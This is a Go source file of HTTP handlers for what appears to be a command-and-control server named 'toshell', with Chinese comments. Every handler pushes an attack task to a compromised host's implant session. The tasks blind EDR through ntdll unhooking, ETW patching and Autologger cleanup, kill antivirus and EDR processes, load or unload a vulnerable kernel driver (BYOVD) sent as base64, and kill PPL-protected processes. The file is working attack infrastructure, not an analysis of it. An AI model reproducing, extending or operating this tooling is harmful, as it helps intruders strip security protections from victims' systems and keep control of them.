package api

import (
	"encoding/json"
	"net/http"

	"github.com/gorilla/mux"
	"toshell/internal/server/logging"
)

// edrBlindHandler 下发 EDR 失明任务（ntdll 脱钩 + ETW patch + Autologger 清理）。
func (s *Server) edrBlindHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]
	if s.listener == nil {
		http.Error(w, `{"error":"Listener not available"}`, http.StatusInternalServerError)
		return
	}
	taskInfo, err := s.taskMgr.CreateEDRBlind(id)
	if err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}
	if err := s.listener.PushTask(id, taskInfo); err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}
	logging.Info("api", "edr_blind pushed to session %s", id)
	json.NewEncoder(w).Encode(map[string]interface{}{
		"task_id":   taskInfo.ID,
		"task_type": taskInfo.TaskType,
		"message":   "EDR blind task pushed",
	})
}

// edrKillHandler 下发 EDR 击杀任务；processes 为空时使用植入端默认杀软进程列表。
func (s *Server) edrKillHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]

	var req struct {
		Processes []string `json:"processes"`
	}
	_ = json.NewDecoder(r.Body).Decode(&req)

	if s.listener == nil {
		http.Error(w, `{"error":"Listener not available"}`, http.StatusInternalServerError)
		return
	}
	taskInfo, err := s.taskMgr.CreateEDRKill(id, req.Processes)
	if err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}
	if err := s.listener.PushTask(id, taskInfo); err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}
	logging.Info("api", "edr_kill (%d procs) pushed to session %s", len(req.Processes), id)
	json.NewEncoder(w).Encode(map[string]interface{}{
		"task_id":   taskInfo.ID,
		"task_type": taskInfo.TaskType,
		"count":     len(req.Processes),
		"message":   "EDR kill task pushed",
	})
}

// byovdLoadHandler 下发 BYOVD 驱动加载任务（driver_b64 + service_name + device_name）。
func (s *Server) byovdLoadHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]
	var req struct {
		DriverB64   string `json:"driver_b64"`
		ServiceName string `json:"service_name"`
		DeviceName  string `json:"device_name"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.DriverB64 == "" {
		http.Error(w, `{"error":"driver_b64 is required"}`, http.StatusBadRequest)
		return
	}
	if s.listener == nil {
		http.Error(w, `{"error":"Listener not available"}`, http.StatusInternalServerError)
		return
	}
	taskInfo, err := s.taskMgr.CreateBYOVDLoad(id, req.DriverB64, req.ServiceName, req.DeviceName)
	if err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}
	if err := s.listener.PushTask(id, taskInfo); err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}
	json.NewEncoder(w).Encode(map[string]interface{}{
		"task_id":   taskInfo.ID,
		"task_type": taskInfo.TaskType,
		"message":   "BYOVD load task pushed",
	})
}

// byovdUnloadHandler 下发 BYOVD 驱动卸载任务。
func (s *Server) byovdUnloadHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]
	var req struct {
		ServiceName string `json:"service_name"`
	}
	_ = json.NewDecoder(r.Body).Decode(&req)
	if s.listener == nil {
		http.Error(w, `{"error":"Listener not available"}`, http.StatusInternalServerError)
		return
	}
	taskInfo, err := s.taskMgr.CreateBYOVDUnload(id, req.ServiceName)
	if err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}
	if err := s.listener.PushTask(id, taskInfo); err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}
	json.NewEncoder(w).Encode(map[string]interface{}{
		"task_id":   taskInfo.ID,
		"task_type": taskInfo.TaskType,
		"message":   "BYOVD unload task pushed",
	})
}

// pplKillHandler 下发 PPL 击杀任务。
func (s *Server) pplKillHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]
	var req struct {
		Processes []string `json:"processes"`
	}
	_ = json.NewDecoder(r.Body).Decode(&req)
	if s.listener == nil {
		http.Error(w, `{"error":"Listener not available"}`, http.StatusInternalServerError)
		return
	}
	taskInfo, err := s.taskMgr.CreatePPLKill(id, req.Processes)
	if err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}
	if err := s.listener.PushTask(id, taskInfo); err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}
	json.NewEncoder(w).Encode(map[string]interface{}{
		"task_id":   taskInfo.ID,
		"task_type": taskInfo.TaskType,
		"message":   "PPL kill task pushed",
	})
}
